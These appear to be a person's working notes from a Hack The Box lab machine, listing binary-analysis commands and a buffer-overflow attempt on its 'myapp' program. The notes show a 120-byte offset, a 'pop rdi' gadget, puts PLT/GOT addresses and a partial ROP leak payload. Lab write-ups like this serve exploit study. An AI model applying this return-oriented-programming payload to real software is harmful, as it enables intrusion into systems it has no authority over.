objdump -D myapp
objdump -x myapp
ropper --file myapp
ropper --file myapp --search "pop rdi"
readelf -s myapp

ROPgadget --binary myapp --only "mov|pop|ret"


readelf --sections myapp


rabin2 -S myapp



r2:
pd @ sym.test
iz
/R pop
iS
/R pop rdi
i


db sym.main
ood



gdb:
```
gdb ./myapp

gdb-peda$ set follow-fork-mode parent
gdb-peda$ b main
gdb-peda$ r


gdb-peda$ x/x
0x7fffffffe1c0:	0x0000000000401070

gdb-peda$ rip
Undefined command: "rip".  Try "help".
gdb-peda$ $rip
Undefined command: "$rip".  Try "help".
gdb-peda$ $esp
Undefined command: "$esp".  Try "help".
gdb-peda$ p $rip
$1 = (void (*)()) 0x401163 <main+4>

gdb-peda$ disassemble
gdb-peda$ vmmap binary
gdb-peda$ vmmap all
gdb-peda$ checksec

gdb-peda$ find "bin"
gdb-peda$ find "/bin/"

gdb-peda$ info functions

gdb-peda$ disassemble test

gdb-peda$ set disassembly-flavor intel
info registers
```


------------------------------------------------------------------
My initial attempts at the BoF
------------------------------------------------------------------



https://ctf101.org/binary-exploitation/return-oriented-programming/
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ set follow-fork-mode parent

gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /root/Documents/htb/boxes/safe/myapp
[Detaching after fork from child process 30278]
 02:03:30 up 1 day, 31 min,  1 user,  load average: 0.10, 0.17, 0.19

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.

gdb-peda$ x/xg $rsp
0x7fffffffe158:	0x414f41413941416a

gdb-peda$ pattern offset 0x414f41413941416a
4706051884014715242 found at offset: 120
```
junk = "A" * 120


```
root@kali:~/Documents/htb/boxes/safe# ropper --file myapp --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: myapp
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040120b: pop rdi; ret;
```
pop_rdi = 0x40120b


Address of main
```
root@kali:~/Documents/htb/boxes/safe# objdump -D myapp|grep main
  401094:	ff 15 56 2f 00 00    	callq  *0x2f56(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
000000000040115f <main>:
```
main - 0x40115f

```
root@kali:~/Documents/htb/boxes/safe# objdump -D myapp|grep puts
0000000000401030 <puts@plt>:
  401030:	ff 25 e2 2f 00 00    	jmpq   *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>
  4011a1:	e8 8a fe ff ff       	callq  401030 <puts@plt>
```

plt (procedural link table) - 0x401030
got (global offset table) - 0x404018

payload = junk + pop_rdi + got_put + plt_put + main

```
payload = "A"*120 + 0x40120b + 0x404018 + 0x401030 + 0x40115f
```
